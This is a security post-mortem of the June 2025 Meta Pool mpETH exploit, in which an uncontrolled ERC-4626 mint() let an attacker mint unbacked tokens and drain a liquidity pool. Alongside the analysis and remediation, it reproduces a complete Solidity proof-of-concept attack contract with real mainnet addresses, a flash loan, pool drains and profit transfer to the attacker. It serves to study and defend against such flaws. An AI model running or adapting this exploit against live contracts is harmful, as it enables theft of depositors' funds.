# Meta Pool — ERC-4626 mint Unvalidated (Missing Access Control) Analysis

| Item | Details |
|------|------|
| **Date** | 2025-06-17 |
| **Protocol** | Meta Pool (mpETH — Ethereum Liquid Staking) |
| **Chain** | Ethereum (Mainnet) |
| **Loss** | $140,000 (actual withdrawal 52.5 ETH ≈ $132,000 / ~$140,000 including DAO compensation) |
| **Attacker** | [0x48f1...1be98](https://etherscan.io/address/0x48f1d0f5831eb6e544f8cbde777b527b87a1be98) |
| **Attack Contract** | [0xff13...4136](https://etherscan.io/address/0xff13d5899aa7d84c10e4cd6fb030b80554424136) |
| **Vulnerable Contract** | [0x48AF...1710](https://etherscan.io/address/0x48afbbd342f64ef8a9ab1c143719b63c2ad81710) (mpETH proxy) |
| **Implementation Contract** | [0x56c5...7ffa](https://etherscan.io/address/0x56c517308ec9dcbe1db9d38e8b42bc7a948f7ffa) (unverified) |
| **Attack Tx** | [0x57ee...fa69](https://etherscan.io/tx/0x57ee419a001d85085478d04dd2a73daa91175b1d7c11d8a8fb5622c56fd1fa69) |
| **Attack Block** | 22,722,911 |
| **Root Cause** | Missing ERC-4626 `mint()` function override — unlimited mpETH minting possible without actual ETH deposit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/MetaPool_exp.sol) |

---

## 1. Vulnerability Overview

Meta Pool is a liquid staking protocol operating on Ethereum that mints mpETH tokens when users deposit ETH. On June 17, 2025, the protocol's mpETH contract was exploited due to a vulnerability where the ERC-4626 standard's `mint()` function was not properly overridden, enabling **unlimited mpETH minting without any actual ETH deposit**.

**Core Vulnerability Combination:**
1. **Missing ERC-4626 `mint()` override**: The standard `mint(shares, receiver)` function could be called without depositing actual assets (ETH)
2. **Missing access control**: Anyone could mint an arbitrary amount of mpETH without any authorization check
3. **Insufficient asset transfer validation in internal `_deposit()`**: Internal minting logic executed without ETH transfer

The attacker borrowed 200 ETH via a Balancer flash loan, legitimately deposited 107 ETH, minted additional mpETH through the vulnerable `mint()` function, then withdrew funds from the liquidity pool. The minted mpETH had a nominal value of **$27M** (9,702 mpETH), but due to limited pool liquidity, actual withdrawals were limited to **52.5 ETH (~$132,000)**.

---

## 2. Vulnerable Code Analysis

### 2.1 Missing ERC-4626 mint() Override — Core Vulnerability

In the ERC-4626 standard, `mint(shares, receiver)` must transfer `assets` corresponding to `shares` into the contract before minting shares. Meta Pool did not properly override this function, allowing it to be called without asset transfer.

**Vulnerable Code (estimated/reconstructed)**:
```solidity
// ❌ Vulnerable: ERC-4626 default mint inherited as-is or override missing
// Caller can mint arbitrary shares to receiver without sending ETH
function mint(uint256 shares, address receiver) public override returns (uint256) {
    // ❌ No ETH deposit validation — no msg.value check logic
    // ❌ No access control — no onlyOwner, whitelist, etc.
    // ❌ No actual transfer validation after assets calculation
    uint256 assets = previewMint(shares);  // Only calculates ETH amount for shares
    _mint(receiver, shares);               // ❌ Mints immediately without receiving ETH
    return assets;
}

// ❌ Internal _deposit also executes without asset transfer
function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
    // ❌ No ETH deposit check
    // ❌ No msg.value == assets validation
    _mint(receiver, shares);  // Mints immediately
    emit Deposit(caller, receiver, assets, shares);
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: ETH deposit validation and access control added to mint function
function mint(uint256 shares, address receiver) public payable override returns (uint256) {
    // ✅ Calculate ETH amount corresponding to shares
    uint256 assets = previewMint(shares);

    // ✅ Verify actual ETH deposit
    require(msg.value >= assets, "mpETH: insufficient ETH deposit");

    // ✅ Return excess ETH
    if (msg.value > assets) {
        payable(msg.sender).transfer(msg.value - assets);
    }

    _mint(receiver, shares);
    emit Deposit(msg.sender, receiver, assets, shares);
    return assets;
}

// ✅ Or disable mint entirely and only allow depositETH
function mint(uint256, address) public pure override returns (uint256) {
    revert("mpETH: use depositETH instead");  // ✅ Direct mint call prohibited
}
```

**Issue**: The ERC-4626 standard's `mint()` function must either be called only internally or always be accompanied by asset transfer. Despite being a native ETH staking protocol that handles ETH directly, Meta Pool inherited the generic ERC-4626 implementation without review, exposing a path to mint mpETH without ETH.

### 2.2 depositETH — Normal Path (Comparison)

```solidity
// ✅ Normal: depositETH receives actual ETH via msg.value
function depositETH(address receiver) external payable returns (uint256 shares) {
    // ✅ Confirms actual ETH received via msg.value
    require(msg.value > 0, "mpETH: zero ETH deposit");
    shares = previewDeposit(msg.value);  // Calculates shares for ETH amount
    _mint(receiver, shares);             // Mints after receiving actual ETH
    emit Deposit(msg.sender, receiver, msg.value, shares);
}
```

**Issue**: While `depositETH()` was correct, the ERC-4626 standard's `mint()` path remained as a bypass.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys attack contract (`0xff13...4136`)
- Standby: No special pre-preparation required (no approve, etc.)

### 3.2 Execution Phase

```
1. [Balancer Flash Loan]
   Attacker contract → Balancer Vault: flashLoan(200 WETH)

2. [WETH → ETH Conversion]
   107 WETH → unwrap → 107 ETH

3. [Legitimate Deposit — Leverage Acquisition]
   depositETH(107 ETH) → Receive 107 mpETH

4. [Vulnerability Exploitation — Core]
   mint(amount, address(this)) → Additional mpETH minted for free
   (Shares obtained without ETH deposit)

5. [Liquidity Pool Drain]
   swapmpETHforETH(97 ETH, 0)   → Swap mpETH for ETH (no slippage)
   swapmpETHforETH(9.6 ETH, 0)  → Additional swap

6. [Uniswap V3 Liquidation]
   exactInputSingle(mpETH → WETH, 10 mpETH, fee=100)

7. [ETH → WETH Re-conversion]
   Remaining ETH → wrap → WETH

8. [Flash Loan Repayment]
   200 WETH → Balancer Vault repayment

9. [Profit Realization]
   Remaining WETH → ETH → Attacker EOA transfer
   Remaining mpETH → Attacker EOA transfer
```

### 3.3 ASCII Attack Flow Diagram

```
┌─────────────────────────────────────────────┐
│           Attacker EOA (0x48f1...1be98)      │
└────────────────────┬────────────────────────┘
                     │ Deploy and call attack contract
                     ▼
┌─────────────────────────────────────────────┐
│      MetaPoolExploit (0xff13...4136)         │
│      Call start()                            │
└────────────────────┬────────────────────────┘
                     │ flashLoan(200 WETH)
                     ▼
┌─────────────────────────────────────────────┐
│         Balancer Vault (Flash Loan)          │
│         Borrow 200 WETH                      │
└────────────────────┬────────────────────────┘
                     │ receiveFlashLoan() callback
                     ▼
┌─────────────────────────────────────────────┐
│  Step 1: 107 WETH → 107 ETH (withdraw)      │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│  Step 2: depositETH(107 ETH)                │
│          → Mint 107 mpETH (normal path)      │
│          mpETH contract (0x48AF...1710)       │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐  ◀── ❌ Vulnerability Exploited
│  Step 3: mint(amount, address(this))        │
│          → Additional mpETH minted for free  │
│          (Shares obtained without ETH)        │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│  Step 4: swapmpETHforETH(97 ETH, 0)         │
│          swapmpETHforETH(9.6 ETH, 0)        │
│          Drain mpETH Pool (0xdF261...03Cc)   │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│  Step 5: Uniswap V3 exactInputSingle        │
│          10 mpETH → WETH (fee=100)           │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│  Step 6: ETH → WETH (wrap remaining)        │
│          200 WETH → Balancer repayment       │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│  Step 7: Remaining ETH + mpETH → Attacker   │
└─────────────────────────────────────────────┘

Result: Attacker profit ≈ 52.5 ETH ($132,000)
        Minted mpETH ≈ 9,702 ($27M nominal)
        Actual loss limited by pool liquidity
```

### 3.4 Outcome

- Fraudulent mpETH minted: ~9,702 mpETH (nominal $27,000,000)
- Actual funds withdrawn: 52.5 ETH (~$132,000)
- Attacker profit: ~52.5 ETH
- Reason for limited loss: Low liquidity in the mpETH/ETH pool prevented full conversion

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Key constants
address constant BALANCER_VAULT    = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant WETH_ADDR         = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant MPETH_ADDR        = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710; // Vulnerable contract
address constant MPETH_TO_ETH_POOL = 0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc;
address constant UNISWAP_V3_ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;

contract MetaPoolExploit {
    address attacker;

    constructor() { attacker = msg.sender; }

    function start() external {
        // Step 1: Request 200 WETH flash loan from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_ADDR;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200 ether;                          // Borrow 200 WETH
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory data
    ) public {
        IWETH weth       = IWETH(payable(WETH_ADDR));
        IMpEth mpEth     = IMpEth(MPETH_ADDR);
        IMpEthPool pool  = IMpEthPool(MPETH_TO_ETH_POOL);
        IV3SwapRouter v3 = IV3SwapRouter(UNISWAP_V3_ROUTER);

        // Step 2: Convert 107 WETH → ETH
        weth.withdraw(107 ether);

        // Step 3: Deposit 107 ETH via normal path → Obtain 107 mpETH
        uint256 amount = mpEth.depositETH{value: 107 ether}(address(this));

        // ❌ Step 4: Exploit vulnerability — call mint() without ETH
        // No ETH validation in mint(shares, receiver), freely mints additional mpETH
        mpEth.mint(amount, address(this));

        // Step 5: Drain pool ETH using acquired mpETH
        mpEth.approve(MPETH_TO_ETH_POOL, type(uint256).max);
        pool.swapmpETHforETH(97 ether, 0);               // Swap without slippage protection
        pool.swapmpETHforETH(9.6 ether, 0);              // Additional swap

        // Step 6: Liquidate remaining mpETH via Uniswap V3
        mpEth.approve(UNISWAP_V3_ROUTER, 1_000_000_000 ether);
        IV3SwapRouter.ExactInputSingleParams memory _params = IV3SwapRouter.ExactInputSingleParams({
            tokenIn: MPETH_ADDR,
            tokenOut: WETH_ADDR,
            fee: 100,                                    // 0.01% fee pool
            recipient: address(this),
            amountIn: 10 ether,
            amountOutMinimum: 0,                         // No slippage protection
            sqrtPriceLimitX96: 0
        });
        v3.exactInputSingle(_params);

        // Step 7: Wrap remaining ETH → WETH
        uint256 ethBalance = address(this).balance;
        weth.deposit{value: ethBalance}();

        // Step 8: Repay 200 WETH flash loan
        IWETH(payable(WETH_ADDR)).transfer(BALANCER_VAULT, 200 ether);

        // Step 9: Remaining WETH → ETH → Transfer to attacker (profit realization)
        uint256 wethBalance = IWETH(payable(WETH_ADDR)).balanceOf(address(this));
        IWETH(payable(WETH_ADDR)).withdraw(wethBalance);
        ethBalance = address(this).balance;
        payable(attacker).call{value: ethBalance}("");   // Transfer ETH profit

        // Step 10: Transfer remaining mpETH → attacker
        uint256 mpEthBalance = IMpEth(MPETH_ADDR).balanceOf(address(this));
        IMpEth(MPETH_ADDR).transfer(attacker, mpEthBalance);
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing ERC-4626 mint() override — shares minted without asset deposit | CRITICAL | CWE-284 (Missing Access Control) |
| V-02 | Missing access control on mint() — callable by anyone | CRITICAL | CWE-284 (Missing Access Control) |
| V-03 | Insufficient asset transfer validation in internal _deposit() | HIGH | CWE-20 (Missing Input Validation) |
| V-04 | No slippage protection in liquidity pool swapmpETHforETH() | MEDIUM | CWE-682 (Incorrect Calculation) |

### V-01: Missing ERC-4626 mint() Override

- **Description**: The ERC-4626 standard's `mint(shares, receiver)` function must first receive the corresponding assets (ETH) before minting shares. Meta Pool did not properly override this function, leaving an open path to mint mpETH without ETH.
- **Impact**: Attacker can mint arbitrary amounts of mpETH with 0 ETH and swap it for real ETH in liquidity pools to drain protocol funds.
- **Attack Condition**: Direct contract interaction possible (no special conditions)

### V-02: Missing Access Control on mint()

- **Description**: The `mint()` function has no authorization checks — no `onlyOwner`, whitelist, or role-based access control (RBAC) — making it callable by anyone.
- **Impact**: The core minting function of an ETH liquid staking protocol is fully public, enabling token inflation and fund theft.
- **Attack Condition**: Immediately exploitable with only the contract address and ABI

### V-03: Insufficient Asset Transfer Validation in _deposit()

- **Description**: The ERC-4626 internal `_deposit()` function calls `_mint()` directly without validating `msg.value` or actual asset transfer.
- **Impact**: Asset-free minting is possible not only via the mint() path but across the entire internal deposit logic.
- **Attack Condition**: Same as V-01

### V-04: No Slippage Protection in swapmpETHforETH()

- **Description**: The PoC set `minAmountOut = 0`, executing swaps without slippage protection. While not a vulnerability itself, it allowed the attacker to drain the pool under maximally favorable conditions.
- **Impact**: Attacker can extract maximum remaining ETH from the liquidity pool.
- **Attack Condition**: When ETH remains in the liquidity pool

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Disable mint() or Add ETH Validation**

```solidity
// ✅ Option A: Completely disable mint() function (recommended)
function mint(uint256, address) public pure override returns (uint256) {
    revert("mpETH: direct mint disabled, use depositETH()");
}

// ✅ Option B: Add ETH deposit validation
function mint(uint256 shares, address receiver) public payable override returns (uint256) {
    uint256 assets = previewMint(shares);
    require(msg.value >= assets, "mpETH: insufficient ETH");
    if (msg.value > assets) payable(msg.sender).transfer(msg.value - assets);
    _mint(receiver, shares);
    emit Deposit(msg.sender, receiver, assets, shares);
    return assets;
}
```

**2) Add ETH Transfer Validation to deposit()**

```solidity
// ✅ ETH-based vaults must also validate msg.value in deposit()
function deposit(uint256 assets, address receiver) public payable override returns (uint256) {
    require(msg.value == assets, "mpETH: ETH amount mismatch");
    uint256 shares = previewDeposit(assets);
    _mint(receiver, shares);
    emit Deposit(msg.sender, receiver, assets, shares);
    return shares;
}
```

**3) Emergency Pause (already executed)**

```solidity
// ✅ Pausable pattern — allows immediate halt upon anomaly detection
// Meta Pool paused the contract on the day of the incident to prevent further damage
modifier whenNotPaused() {
    require(!paused, "mpETH: contract paused");
    _;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing ERC-4626 mint() override | Override all asset transfer functions when inheriting ERC-4626 in native ETH vaults |
| Missing access control | Apply `onlyOwner` or whitelist to minting functions, or disable entirely |
| Insufficient internal _deposit validation | Add `msg.value` or `IERC20.transferFrom` validation inside `_deposit()` |
| No slippage protection | Enforce minimum output amount in `swapmpETHforETH()` (`minAmountOut > 0`) |
| No post-deployment audit | Require professional security audit before deploying core minting functions |
| Insufficient monitoring | Build real-time alerting system for abnormal large-scale mint events |

---

## 7. Lessons Learned

1. **Review all public functions when inheriting ERC-4626**: Even when standard interface functions come with default implementations, protocols handling native ETH must 100% override asset transfer logic. Unnecessary entry points should be disabled by default.

2. **"Unused functions" can also become vulnerabilities**: Even if the intent was to only use `depositETH()`, the `mint()` inherited from ERC-4626 becomes an attack vector if left open. The Principle of Least Privilege must be implemented at the code level.

3. **Liquid staking token minting functions must be treated as CRITICAL**: The `mint()` of staking tokens like mpETH affects the entire protocol's TVL, making a professional security audit mandatory before deployment.

4. **Flash loans are vulnerability amplifiers**: Flash loans themselves are not vulnerabilities. In this incident, the flash loan merely provided the attacker with sufficient capital — the root cause was the missing access control on `mint()`. Fixing the core vulnerability is the priority.

5. **Low pool liquidity naturally limited the damage**: Although $27M USD worth was minted, actual losses were limited to $140K. However, this was luck, not design. Full draining would have been possible with sufficient liquidity.

6. **The emergency pause mechanism prevented further losses**: Meta Pool's rapid detection and contract pause minimized the damage. All DeFi protocols should have a Pausable pattern and real-time anomalous transaction monitoring.

7. **Frontrunning (Yoink) attacks also occurred**: The first transaction was front-run by a sandwich bot (0x80BF...BD4e4). While MEV bots sometimes play a whitehat role during security incidents, this should not be recognized as an intentional protection mechanism.

---

## 8. On-Chain Verification

Based on on-chain transaction data:

### 8.1 PoC vs On-Chain Amounts Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan size | 200 WETH | 200 WETH | ✅ |
| Legitimate ETH deposit | 107 ETH | 107 ETH | ✅ |
| swapmpETHforETH #1 | 97 mpETH | ~97 mpETH | ✅ |
| swapmpETHforETH #2 | 9.6 mpETH | ~9.6 mpETH | ✅ |
| Uniswap V3 liquidation | 10 mpETH | ~10 mpETH | ✅ |
| Actual ETH withdrawn | ~52.5 ETH | 52.5 ETH | ✅ |
| Total mpETH minted | Nominal $27M | ~9,702 mpETH | ✅ |

### 8.2 On-Chain Event Log Sequence

1. `FlashLoan` — Balancer Vault: 200 WETH borrowed
2. `Transfer(WETH → 0x00)` — 107 WETH burned (unwrapped)
3. `Deposit` (mpETH) — 107 ETH → 107 mpETH minted
4. `Transfer(0x00 → exploit)` — Additional mpETH minted via mint() call (**core vulnerability**)
5. `Swap` (mpETH Pool) — mpETH → ETH swap (97 + 9.6 mpETH)
6. `Swap` (Uniswap V3) — 10 mpETH → WETH
7. `Transfer(WETH → Balancer)` — 200 WETH repaid
8. `Transfer(ETH → attacker)` — Profit transferred

### 8.3 Precondition Verification

| Item | Pre-Attack State |
|------|-------------|
| mpETH contract pause status | Not paused (active) |
| mint() access control | None — callable by anyone |
| Attacker ETH balance | Secured via flash loan (no prior capital required) |
| mpETH/ETH pool liquidity | Limited (~52.5 ETH level) |
| Pre-set approve | Not required |

> **On-Chain Verification Reference**: Attack Tx `0x57ee419a001d85085478d04dd2a73daa91175b1d7c11d8a8fb5622c56fd1fa69` can be verified directly on Etherscan. The implementation contract (`0x56c5...7ffa`) is unverified on Etherscan.

---

*References: [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/MetaPool_exp.sol) | [QuillAudits Analysis](https://www.quillaudits.com/blog/hack-analysis/meta-pool-hack-analysis) | [OKX Analysis](https://www.okx.com/en-us/learn/meta-pool-mpeth-eth-exploit)*